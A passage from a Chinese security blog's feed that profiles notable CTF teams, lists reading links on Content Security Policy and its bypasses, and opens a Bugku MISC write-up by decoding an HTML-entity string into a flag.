    <content type="html"><![CDATA[<p>阮一峰：<a href="http://www.ruanyifeng.com/blog/2016/09/csp.html" target="_blank" rel="noopener">Content Security Policy 入门教程</a></p><p><a href="https://en.wikipedia.org/wiki/Content_Security_Policy" target="_blank" rel="noopener">Content Security Policy</a></p><p><a href="https://lorexxar.cn/2017/05/16/nonce-bypass-script/" target="_blank" rel="noopener">通过浏览器缓存来bypass CSP script nonce</a></p><p>梅子酒： <a href="https://mp.weixin.qq.com/s/ljBB5jStB7fcJq4cgdWnnw" target="_blank" rel="noopener">使用 Wave 文件绕过 CSP 策略</a></p><a id="more"></a>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;阮一峰：&lt;a href=&quot;http://www.ruanyifeng.com/blog/2016/09/csp.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Content Security Policy 入门教程&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Content_Security_Policy&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Content Security Policy&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://lorexxar.cn/2017/05/16/nonce-bypass-script/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;通过浏览器缓存来bypass CSP script nonce&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;梅子酒： &lt;a href=&quot;https://mp.weixin.qq.com/s/ljBB5jStB7fcJq4cgdWnnw&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;使用 Wave 文件绕过 CSP 策略&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://blog.Lhaihai.wang/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CSP" scheme="http://blog.Lhaihai.wang/tags/CSP/"/>
    
  </entry>
  
  <entry>
    <title>国内外杰出的CTF战队（持续更新）</title>
    <link href="http://blog.Lhaihai.wang/2018/05/20/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F/"/>
    <id>http://blog.Lhaihai.wang/2018/05/20/国内外杰出的CTF战队/</id>
    <published>2018-05-20T14:40:46.000Z</published>
    <updated>2018-05-20T16:34:02.237Z</updated>
    
    <content type="html"><![CDATA[<p>因为觉得自己和同学只是会打打CTF，对国际和国内一些Team不是很了解，特地开了这篇博客,本文的资料均来自下方链接，目前主要内容来自 公众号：<a href="javascript:void(0" target="_blank" rel="noopener">腾讯安全联合实验室</a>;) ，<a href="https://www.xctf.org.cn/" target="_blank" rel="noopener">XCTF社区</a></p><a id="more"></a><p><a href="https://mp.weixin.qq.com/s/QdwpnVdz4fV0qJKTgoMO9w" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/QdwpnVdz4fV0qJKTgoMO9w</a></p><p><a href="https://mp.weixin.qq.com/s/Fp7Ja_nzIHy84yeWRi6l0Q" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Fp7Ja_nzIHy84yeWRi6l0Q</a></p><p><a href="https://www.leiphone.com/news/201706/9KnCeQQXC1vrHVrt.html" target="_blank" rel="noopener">https://www.leiphone.com/news/201706/9KnCeQQXC1vrHVrt.html</a></p><h3 id="蓝莲花战队"><a href="#蓝莲花战队" class="headerlink" title="蓝莲花战队"></a>蓝莲花战队</h3><p>蓝莲花（Blue-Lotus）战队是一支源自清华大学的网络安全技术竞赛和研究团队，是中国参与CTF（Capture The Flag）网络安全技术竞赛成绩最为突出的一支国际知名战队。</p><p>2013年成为华人世界历史上首支成功闯入DEFCON黑客大会 CTF全球总决赛[1] 的队伍，并获得安全宝冠名赞助。2014年连续第二次入围DEFCON CTF全球总决赛，并获得第五名的优秀战绩。2014年蓝莲花战队成功组织BCTF“百度杯”全国网络安全技术对抗赛，成为当时全国参与规模最大的CTF赛事，并在2014至2015年开始发起并总体组织XCTF全国网络安全技术对抗联赛。 </p><h3 id="AAA战队："><a href="#AAA战队：" class="headerlink" title="AAA战队："></a>AAA战队：</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640.webp" alt="img"></p><p>AAA战队是由浙江大学信息安全爱好者自发组织、浙江大学计算机学院支持建立的团队，在CTF圈颇有名气，曾获2016年ZCTF冠军、TCTF 2017新人邀请赛冠军、WHCTF 2017冠军、以及2017年高校网络信息安全管理运维挑战赛全国总冠军；并于2017年与腾讯、上海交通大学、复旦大学组成腾讯A0E联合战队参加DEF CON CTF 2017全球总决赛，在全球十数支顶级战队中斩获季军。在TCTF 2018的线上预赛阶段，AAA战队在也取得了第一名。</p><p>毫无疑问，他们是本年度TCTF夺冠的热门战队。</p><h3 id="Redbud战队：专注实力提升"><a href="#Redbud战队：专注实力提升" class="headerlink" title="Redbud战队：专注实力提升"></a>Redbud战队：专注实力提升</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833800626.webp" alt="img"></p><p>Redbud战队由来自清华大学学生网络安全技术协会的信息安全爱好者组成。Redbud，意为”紫荆”，战队的宗旨是不为名次和奖励，只为锻炼和提升个人的技术水平，加强和CTF优秀选手的交流与互动，并为国内知名战队——蓝莲花战队（Blue-Lotus）培养后备力量。</p><p>该战队的成绩从去年第四届XCTF联赛线上赛以来一直保持着高位，最近更是迎来了全面的爆发，在本届TCTF 线上预赛以第二名的成绩挺进决赛。</p><h3 id="emmmm战队：看队名看不透实力"><a href="#emmmm战队：看队名看不透实力" class="headerlink" title="emmmm战队：看队名看不透实力"></a>emmmm战队：看队名看不透实力</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833809327.webp" alt="img"></p><p>emmmm战队是由哈尔滨工业大学、北京邮电大学和中国科学技术大学组成的联合战队，战队名字颇为俏皮，但备赛经验丰富，在本届TCTF线上预赛中位列高校战队前三。</p><p>emmmm战队表示，要在TCTF 2018线下决赛取得突破性成绩，努力摘得桂冠。</p><h3 id="Vidar战队：“As-we-do-as-you-know”"><a href="#Vidar战队：“As-we-do-as-you-know”" class="headerlink" title="Vidar战队：“As we do, as you know”"></a>Vidar战队：“As we do, as you know”</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833812099.webp" alt="img"></p><p>Vidar战队来自杭州电子科技大学，是浙江高校中最早建立的白帽黑客团队，由杭电信息安全协会（原HDUISA）和网络空间安全学院合并而成。团队前身 HDUISA 是杭州电子科技大学信息安全协会。Vidar战队中聚集了一批又一批对信息技术感兴趣的同学，互相交流学习信息安全领域的知识及技术。同时为了检测自己的水平，以国内外的各种相关比赛为载体与各大高校乃至列强劲旅一较高下，至今已成功举办九届HCTF比赛。</p><p>该战队认为，编程技术可谓一日千里，新漏洞层出不穷，CTF题目的脑洞越开越大，实践能力是关键。As we do, as you know。</p><h3 id="kap0k战队：迅速崛起的新生力量"><a href="#kap0k战队：迅速崛起的新生力量" class="headerlink" title="kap0k战队：迅速崛起的新生力量"></a>kap0k战队：迅速崛起的新生力量</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833816419.webp" alt="img"></p><p>​      kap0k 团队是一支源自华南理工大学的网络安全技术竞赛和研究团队，成立于 2017 年三月。 kap0k 名字源自木棉树，为华南理工大学校树，寓意着团队成员对技术的不懈追求和对黑客自由精神的坚守。建队以来，秉持着以技术让网络更安全的理念，kap0k 的成员在校园网安全建设、CTF 竞赛、安全大数据竞赛等安全的诸多方面都有所建树。kap0k 是实力正在迅速增强的新生CTF战队， 曾在第四届XCTF联赛揭幕战武汉站WHCTF线上赛取得第八名的好成绩。</p><h3 id="MxM战队：-网络安全与执法并重"><a href="#MxM战队：-网络安全与执法并重" class="headerlink" title="MxM战队： 网络安全与执法并重"></a>MxM战队： 网络安全与执法并重</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833820127.webp" alt="img"></p><p>​     MxM来自浙江警察学院，是警校的优良作风建设下迅速崛起的新生力量，实力演绎警校学生对信息安全领域的不停追求与探索。该战队表示，通过参加专业CTF赛事，加强自身网络安全法制实践能力，是提高网络警察专业的人员执法能力和效率的保障。</p><h3 id="Lancet战队：做网络世界的手术刀"><a href="#Lancet战队：做网络世界的手术刀" class="headerlink" title="Lancet战队：做网络世界的手术刀"></a>Lancet战队：做网络世界的手术刀</h3><p><img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="img"></p><p>Lancet源自于北京航空航天大学的网络安全技术竞赛和研究团队，战队成立于2015年10月，获得过2016年信息安全与对抗技术竞赛分组对抗赛全国一等奖、“安恒杯”全国高校网络安全技能竞赛第一名、“美亚柏科”大学生网络空间安全精英邀请赛第一名等多个奖项。2017 年在GMIC-XCTF京津冀邀请赛稳居冠军宝座；第四届XCTF联赛揭幕战武汉站WHCTF线上赛排名第三，网络安全经验丰富，实力不凡。</p><p>Lancet战队表示，要做网络世界的手术刀，既要撕裂网络世界的表面看到安全隐患，也要为网络安全主刀消除隐患。</p><h3 id="kn0ck战队：“To-be-or-not-to-be”"><a href="#kn0ck战队：“To-be-or-not-to-be”" class="headerlink" title="kn0ck战队：“To be or not to be”"></a><em>kn0ck</em>战队：“To be or not to be”</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833822811.webp" alt="img"></p><p><em>kn0ck</em>战队于2018上半年成立，是多个高校组合联盟战队，由国内信息安全专业实力雄厚的高校学生组成。战队成员因兴趣与热爱而聚集，以不服输的精神全力向着梦想进发。</p><p>作为一支新兴的CTF队伍，战队的宗旨是通过实际比赛将理论知识更好的发挥，以赛代练，锻炼和提升个人的技术水平，在比赛中广交朋友，共同进步。今年，该战队在赛博地球杯工业互联网安全大赛线上初赛榜单上位居前十。</p><h3 id="Ph0t1n1a战队：以赛代练，提高实战能力"><a href="#Ph0t1n1a战队：以赛代练，提高实战能力" class="headerlink" title="Ph0t1n1a战队：以赛代练，提高实战能力"></a>Ph0t1n1a战队：以赛代练，提高实战能力</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833825552.webp" alt="img"></p><p>Ph0t1n1a是来自上海交通大学一支新兴的极客力量。其队名源于上海交通大学校花——石楠花（photinia）英文单词的变形。</p><p>Ph0t1n1a战队的宗旨是：以赛代练，在比赛中提高自己的实战能力。</p><h3 id="CNSS战队：“Stay-hacking-stay-exploring”"><a href="#CNSS战队：“Stay-hacking-stay-exploring”" class="headerlink" title="CNSS战队：“Stay hacking, stay exploring”"></a>CNSS战队：“Stay hacking, stay exploring”</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833827489.webp" alt="img"></p><p>CNSS战队，来自由电子科技大学信息安全爱好者自发组织的一个研究网络安全的技术团队——凝聚工作室，是电子科大古老工作室文化的代表；开放、包容，有着对技术的独特理解。该战队曾在世界顶级黑客大会Hack in the box(HITB)的CTF线上赛中，取得全球第17名的好成绩。</p><p>CNSS战队认为，凝聚工作室存在的价值和意义是一种校园创新文化的营造，一届又一届地传递一种挑战的精神和文化。</p><h3 id="Blue-Whale战队：培养信息安全兴趣是初衷"><a href="#Blue-Whale战队：培养信息安全兴趣是初衷" class="headerlink" title="Blue-Whale战队：培养信息安全兴趣是初衷"></a>Blue-Whale战队：培养信息安全兴趣是初衷</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833830085.webp" alt="img"></p><p>Blue-Whale来自中国海洋大学，2012年依托于中国海洋大学信息安全实验室而成立。团队以中国海洋大学信息安全实验室为基础，专注于信息安全领域研究，研究方向包括系统安全、渗透测试、密码学等。自成立之初，Blue-Whale团队始终以培养信息安全兴趣，研究与分享信息安全知识与技术为目标。历经两年发展后，Blue-Whale战队开始活跃于国内外各类CTF比赛中。在2013-2014年山东省大学生信息安全知识竞赛中包揽团队和个人冠军，在2016年全国大学生信息安全大赛中获得二等奖。</p><h3 id="WaterDrop：“方寸之间，深不见底”"><a href="#WaterDrop：“方寸之间，深不见底”" class="headerlink" title="WaterDrop：“方寸之间，深不见底”"></a>WaterDrop：“方寸之间，深不见底”</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833832679.webp" alt="img"></p><p>WaterDrop，来自中山大学的一支新兴战队，第一代组建于2017年初。战队名WaterDrop取自科幻小说《三体》中提到的由强相互作用力材料（SIM）所制成的宇宙探测器，寄寓着我们的目标。因为其形状与水滴相似所以被人类称之为水滴，会反射几乎100%的电磁波，完全由被强相互作用力紧密锁死的质子与中子构成，无坚不摧，“方寸之间，深不见底”。</p><h3 id="NeSE战队：Never-Stop-Exploiting"><a href="#NeSE战队：Never-Stop-Exploiting" class="headerlink" title="NeSE战队：Never Stop Exploiting"></a>NeSE战队：Never Stop Exploiting</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833834657.webp" alt="img"></p><p>NeSE成立于2015年，主要成员都来自中国科学院信息工程研究所，战队全称为“Never Stop Exploiting”， 象征着永不停止钻研的极客精神。NeSE战队一直以来都希望通过参加高层次的CTF竞赛，提高实践能力，累积互联网攻防经验。战队成绩也十分突出，曾获得TCTF 2017预赛第六、决赛第十，AliCTF 2016国内第一，第十届全国大学生信息安全竞赛线上赛第一名等成绩。</p><p>在本届TCTF预赛阶段，NeSE战队以十二名的成绩出线，成为决赛夺冠竞争者。</p><h3 id="Dragon-Sector战队：波兰劲旅"><a href="#Dragon-Sector战队：波兰劲旅" class="headerlink" title="Dragon Sector战队：波兰劲旅"></a>Dragon Sector战队：波兰劲旅</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833836523.webp" alt="img"></p><p>Dragon Sector战队是一支来自波兰的战队，隶属于Google安全团队，成立于2013年2月。Dragon Sector战队目前有16名活跃队员，经常参加线上线下安全竞赛。这支队伍非常擅长“逆向”领域的试题，整体解题思路非常特殊，经常出人意料。尤其在比赛中后劲十足，往往成为CTF比赛的焦点，他们在比赛中的解题思路也经常被波兰当地杂志刊登。</p><p>在CTFTIME梳理的近五年全球CTF战队评级中，Dragon Sector都位列前十，2018年的实力评级为第五，是一支名副其实的劲旅。</p><h3 id="lotus-r3kapig战队-“给我一朵蓝莲花，我能撬起一飞猪”"><a href="#lotus-r3kapig战队-“给我一朵蓝莲花，我能撬起一飞猪”" class="headerlink" title="lotus-r3kapig战队: “给我一朵蓝莲花，我能撬起一飞猪”"></a>lotus-r3kapig战队: “给我一朵蓝莲花，我能撬起一飞猪”</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833838758.webp" alt="img"></p><p>lotus-r3kapig战队是由国内蓝莲花、Eur3kA和flappypig三支战队组建的联合战队，自称是“究极完全体阿基米德莲花猪”，在TCTF 2018国际赛预赛中位列第三。该战队的口号是：“给我一朵蓝莲花，我能撬起一飞猪”。</p><h3 id="Cykor战队：冠军专业户"><a href="#Cykor战队：冠军专业户" class="headerlink" title="Cykor战队：冠军专业户"></a>Cykor战队：冠军专业户</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833841469.webp" alt="img"></p><p>Cykor战队由韩国大学生信息安全研究俱乐部组成，成立于2011年。他们在第二届XCTF国际联赛总决赛中荣获冠军；在TrendMicro CTF、Codegate 2017 prequals以及SECCON 2016 Final competition等诸多大赛中都曾摘得桂冠。最令人印象深刻的是，CyKor成员参与的DEFKOR战队在2015年DEF CON世界顶级黑客大赛中上演绝地反击、力压PPP战队的精彩一战使他们成为首个赢得DEF CON CTF冠军的韩国黑客团队，也正是因为这场比赛让他们一战成名。</p><p>而这对于Cykor战队来说并不是终点，战队成员一致认为，参加这么多CTF比赛，就是为了追赶世界顶级极客的步伐。</p><p>曾因韩国神童Lokihardt的加入，获得趋势亚太CTF、HITCON CTF 2015和HDCON CTF 2015的冠军，在Belluminar 2016夺得亚军，在Codegate 2017 prequals 和SECCON 2016 决赛中获得冠军。</p><h3 id="PwnThyBytes战队：主要是回馈社会"><a href="#PwnThyBytes战队：主要是回馈社会" class="headerlink" title="PwnThyBytes战队：主要是回馈社会"></a>PwnThyBytes战队：主要是回馈社会</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833844562.webp" alt="img"></p><p>PwnThyBytes战队是来自罗马尼亚的队伍，成立于2015年，有着非常丰富的大赛经验，曾参加过Codegate CTF 2014、2017，TCTF 2017，HITCON CTF 2016，SECCON 2015，Trend Micro 2016 、2017。该战队表示，多次参加比赛除了获得优秀的成绩之外，更主要的是为回馈社会。</p><p>在TCTF 2018，他们将全力以赴，展示战队的安全技术和挑战能力，并取得好成绩。</p><h3 id="战队：无限的可能性"><a href="#战队：无限的可能性" class="headerlink" title="******战队：无限的可能性"></a><code>******战队</code>：无限的可能性</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833846884.webp" alt="img"></p><p> 战队由复旦大学在校生和已毕业的各领域专家共同组成，队名六颗星星代指六个通配符，意为无限的可能性。自2014年成立以来，战队在很多比赛中取得了优异的成绩，曾获XCTF 2014成都分站赛第三，ACTF 2015冠军，SSCTF 2016线上赛第七，0CTF 2016决赛第八。</p><p>2017年7月，战队还和腾讯eee战队、上海交大0ops战队、浙大AAA战队组成腾讯A0E联合战队，参加世界顶级黑客大会DEF CON，位列前三。</p><h4 id="专访-CTF出题战队六星队员杨森：老牌战队新的征程"><a href="#专访-CTF出题战队六星队员杨森：老牌战队新的征程" class="headerlink" title="专访*CTF出题战队六星队员杨森：老牌战队新的征程"></a><a href="https://www.xctf.org.cn/library/details/5e3826c16e9ec358323a6a85ebb651bcd2099b57/" target="_blank" rel="noopener">专访*CTF出题战队六星队员杨森：老牌战队新的征程</a></h4><h3 id="LC↯-BC战队-战斗民族心怀宇宙"><a href="#LC↯-BC战队-战斗民族心怀宇宙" class="headerlink" title="LC↯ BC战队: 战斗民族心怀宇宙"></a>LC↯ BC战队: 战斗民族心怀宇宙</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833849376.webp" alt="img"></p><p>LC↯ BC战队来自俄罗斯，战队命名颇为玄妙，灵感来源于地球的一部分构成方式。曾在2015年获得EKOPARTY CTF，PHD CTF Finals，CONFidence CTF及Belluminar Seoul等国际CTF比赛的冠军。LCBC战队还曾主办了QIWI CTF 2014和Olympic CTF 2014等比赛。战队位列CTFTIME全球排行榜2017年度全球第六、2016年度全球第四。</p><h3 id="SpamAndHex战队：多瑙河畔的传统强队"><a href="#SpamAndHex战队：多瑙河畔的传统强队" class="headerlink" title="!SpamAndHex战队：多瑙河畔的传统强队"></a>!SpamAndHex战队：多瑙河畔的传统强队</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833851822.webp" alt="img"></p><p>!SpamAndHex战队来自匈牙利布达佩斯技术经济大学的CrySyS实验室,曾获得多项国际CTF比赛冠军，例如2017WCTF世界黑客大师赛第十三名，在CTFTIME 2014年的评级中位列前二十。</p><h3 id="Nu1L战队：国内冠军拿到手软"><a href="#Nu1L战队：国内冠军拿到手软" class="headerlink" title="Nu1L战队：国内冠军拿到手软"></a>Nu1L战队：国内冠军拿到手软</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833854452.webp" alt="img"></p><p> Nu1L战队成员来自于上海科技大学、西华大学、成都信息工程大学、北京理工大学等全国多所高校，最早是由两个研究Web的同学创建，队名源于计算机中语言中经常出现的“NULL”。Nu1L战队的小伙伴们都对信息安全以及CTF比赛有着浓厚的兴趣，他们在过去的比赛中战绩辉煌，曾获SCTF 2016冠军、LCTF 2016冠军、第一届百度杯信息攻防总决赛冠军、NJCTF 2017冠军、BCTF 2017冠军、LCTF 2017冠军、TCTF 2017新人邀请赛亚军、第三届XCTF总决赛季军，同时主办了N1CTF 2018，是冲击本届TCTF冠军的有力竞争者。</p><h3 id="TokyoWesterns战队：来自东京的极客"><a href="#TokyoWesterns战队：来自东京的极客" class="headerlink" title="TokyoWesterns战队：来自东京的极客"></a>TokyoWesterns战队：来自东京的极客</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833856983.webp" alt="img"></p><p>TokyoWesterns战队成员均在东京西部生活或是上学，战队名称因此得来；曾获得日本SEC CON等国际赛事冠军，CTFTIME全球排行榜2017年度全球第五位，目前排名也在全球前十位。同时，作为赛事主办方，TokyoWesterns战队也可圈可点，已连续举办三届Tokyo Westerns CTF。</p><h3 id="ROIS战队：-把兴趣做到极致"><a href="#ROIS战队：-把兴趣做到极致" class="headerlink" title="ROIS战队： 把兴趣做到极致"></a>ROIS战队： 把兴趣做到极致</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833861967.webp" alt="img"></p><p>ROIS战队是由福州大学数学与计算机科学、软件工程学院的同学组成的团队，得到了网络系统信息安全福建省高校重点实验室老师的指导。团队分为核心小组和兴趣小组，旨在为对信息安全有兴趣的同学提供技术交流和学习平台，主要参加各类CTF比赛以及为校园网络做安全测试。ROIS战队曾在首届XCTF联赛上海站决赛中获得第四名，并在最终总决赛中获得季军，在CTFTIME 2016年度的排名中位列第八十六。</p><h3 id="Shellphish战队-看到漏洞威胁就像普通人看到颜色一样"><a href="#Shellphish战队-看到漏洞威胁就像普通人看到颜色一样" class="headerlink" title="Shellphish战队: 看到漏洞威胁就像普通人看到颜色一样"></a>Shellphish战队: 看到漏洞威胁就像普通人看到颜色一样</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833864005.webp" alt="img"></p><p>Shellphish是来自美国的战队，战队成员遍布美国、法国、中国、巴西和塞内加尔等国，规模庞大，曾获得TCTF 2017国际赛的冠军。Shellphish战队的部分成员还参加了美国国防部高级研究计划局（DARPA）主办的Cyber Grand 挑战赛的决赛，并从中获得了75万美元的奖金，在CTFTIME 2017年度的排名中位列第9，2015年位列第4。他们对极客技术有着近乎疯狂的痴迷，自称“看到漏洞威胁就像普通人看到颜色一样”。</p><h3 id="217"><a href="#217" class="headerlink" title="217"></a>217</h3><p>来自中国宝岛台湾，台湾大学的战队，CTFTIME全球排名2016年第6，在国内国际赛场战果丰硕，曾获首届XCTF联赛总决赛冠军，在国际重量级赛事Plaid CTF及SECCON CTF中也均取得过第一名的好成绩。 </p><h3 id="403-Forbidden"><a href="#403-Forbidden" class="headerlink" title="403 Forbidden"></a>403 Forbidden</h3><p>同样也是来自宝岛台湾的战队，是台湾著名战队HITCON的成员，HITCON曾获得2016年DEF CON CTF第4名，2017年Boston Key Party CTF冠军。403 Forbidden以本次在TCTF国际赛中的成绩，暂居CTFTIME全球排名第97。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;因为觉得自己和同学只是会打打CTF，对国际和国内一些Team不是很了解，特地开了这篇博客,本文的资料均来自下方链接，目前主要内容来自 公众号：&lt;a href=&quot;javascript:void(0&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;腾讯安全联合实验室&lt;/a&gt;;) ，&lt;a href=&quot;https://www.xctf.org.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;XCTF社区&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF Team" scheme="http://blog.Lhaihai.wang/tags/CTF-Team/"/>
    
  </entry>
  
  <entry>
    <title>Bugku-MISCWriteUp</title>
    <link href="http://blog.Lhaihai.wang/2018/05/20/Bugku-MISCWriteUp/"/>
    <id>http://blog.Lhaihai.wang/2018/05/20/Bugku-MISCWriteUp/</id>
    <published>2018-05-20T08:24:04.000Z</published>
    <updated>2018-05-20T08:29:23.670Z</updated>
    
    <content type="html"><![CDATA[<p>本来AFCTF2018校赛前刷了一半了，然后搞校赛了，然后才这个周末刷完。</p><p>待会还有安恒杯月赛，手有点酸，哈哈。</p><a id="more"></a><h2 id="这是一张单纯的图片"><a href="#这是一张单纯的图片" class="headerlink" title="这是一张单纯的图片"></a>这是一张单纯的图片</h2><p>下载下来用UE打开，发现最后有下面的字符，很明显是Unicode编码，解码一下拿到flag，注意手动加一下}</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#107;&amp;#101;&amp;#121;&amp;#123;&amp;#121;&amp;#111;&amp;#117;&amp;#32;&amp;#97;&amp;#114;&amp;#101;&amp;#32;&amp;#114;&amp;#105;&amp;#103;&amp;#104;&amp;#116;&amp;#125</span><br></pre></td></tr></table></figure><p>flag</p><blockquote><p>key{you are right}</p></blockquote><h2 id="隐写"><a href="#隐写" 